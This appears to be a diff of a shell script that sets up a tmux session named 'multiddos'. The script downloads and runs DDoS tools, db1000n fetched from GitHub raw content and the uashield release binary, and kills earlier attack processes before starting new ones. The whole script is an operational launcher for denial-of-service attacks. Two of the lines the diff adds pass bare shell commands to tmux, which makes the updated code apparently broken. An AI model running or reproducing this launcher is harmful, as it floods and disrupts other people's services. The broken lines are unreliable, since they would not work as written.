@@ -52,14 +52,12 @@ done
 EOF
 
 launch () {
-echo "mode:" $mode
-sleep 5
 if [ ! -f "/usr/local/bin/gotop" ]; then
     curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
     sudo dpkg -i gotop.deb
 fi
 
-tmux kill-session -t multiddos; sudo pkill node;
+tmux kill-session -t multiddos; sudo pkill node; sudo pkill shield
 # tmux mouse support
 grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
 tmux source-file ~/.tmux.conf
@@ -74,9 +72,12 @@ tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/mai
 fi
 
 if [[ $mode == "-m3" ]]; then
-curl -L https://github.com/opengs/uashield/releases/download/v1.0.3/shield-1.0.3.tar.gz -o shield.tar.gz
-tar -xzf shield.tar.gz --strip 1
-tmux split-window -v './shield'
+#curl -L https://github.com/opengs/uashield/releases/download/v1.0.3/shield-1.0.3.tar.gz -o shield.tar.gz
+#tar -xzf shield.tar.gz --strip 1
+#tmux split-window -v './shield'
+tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.3/shield-1.0.3.tar.gz -o shield.tar.gz'
+tmux 'tar -xzf shield.tar.gz --strip 1'
+tmux './shield'
 fi
 
 tmux select-pane -t 0
